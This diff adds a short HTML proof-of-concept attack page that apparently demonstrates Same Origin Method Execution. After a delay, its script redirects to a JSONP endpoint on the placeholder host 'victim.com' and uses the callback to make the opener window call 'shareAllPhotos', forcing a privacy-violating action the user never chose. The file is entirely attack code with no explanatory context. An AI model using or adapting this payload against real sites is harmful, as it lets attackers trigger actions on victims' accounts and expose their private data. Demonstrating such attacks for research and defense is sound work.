@@ -1,0 +1,10 @@
+<html>
+
+<script>
+function waitForDOM() {
+	window.location.href ="http://victim.com/some/jsonp.php?callback=window.opener.shareAllPhotos";
+}
+setTimeout(waitForDOM,3000);
+</script>
+
+</html>
